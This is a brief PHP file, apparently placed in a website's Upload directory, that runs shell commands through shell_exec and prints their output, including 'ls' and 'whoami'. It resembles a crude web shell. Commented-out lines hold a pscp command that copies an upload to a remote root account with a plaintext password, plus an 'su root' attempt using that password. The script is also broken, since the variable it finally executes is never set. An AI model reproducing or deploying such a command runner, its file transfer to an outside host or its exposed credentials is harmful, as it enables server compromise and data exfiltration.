<?php 
//$instruction="pscp -pw tNva5trCm2 -r /var/www/svarog/data/www/obicardroyting.141592.org/Upload/lox.SND root@37.1.192.35:/var/www/ilyasoad/data/";
//$instruction="ls -l";
echo shell_exec('cd /var/www/svarog/data/www/obicardroyting.141592.org/Upload/');
echo shell_exec('ls');
//shell_exec("su root ;tNva5trCm2 ") 
//shell_exec("cd /");
echo shell_exec("whoami");
//echo shell_exec("ls");
//echo $instruction;
$output=shell_exec($instruction);
// or die("fuck");
print_r ($output);
?>